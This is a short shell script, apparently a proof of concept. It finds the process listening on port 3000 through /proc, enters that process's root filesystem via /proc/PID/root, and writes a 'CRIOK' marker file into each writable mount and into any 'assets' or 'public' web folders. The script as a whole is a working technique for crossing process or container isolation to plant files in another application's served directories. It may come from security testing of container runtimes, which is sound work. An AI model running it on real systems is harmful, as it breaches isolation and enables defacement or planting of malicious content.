#!/bin/sh
ino=$(awk '$2 ~ /:0BB8$/ && $4 == "0A" {print $10; exit}' /proc/net/tcp 2>/dev/null)
p=''
[ -n "$ino" ] && for fd in /proc/[0-9]*/fd/*; do [ "$(readlink "$fd" 2>/dev/null)" = "socket:[$ino]" ] && { p=${fd#/proc/}; p=${p%%/*}; break; }; done
[ -n "$p" ] || exit 0
R=/proc/$p/root
for m in $(awk '$0 ~ / rw,/ {print $5}' /proc/$p/mountinfo 2>/dev/null | grep -vE '^/(proc|sys|dev)'); do
  echo CRIOK > "$R$m/zzz9.txt" 2>/dev/null
  [ -d "$R$m/assets" ] && echo CRIOK > "$R$m/assets/zzz9.txt" 2>/dev/null
  [ -d "$R$m/public" ] && echo CRIOK > "$R$m/public/zzz9.txt" 2>/dev/null
done
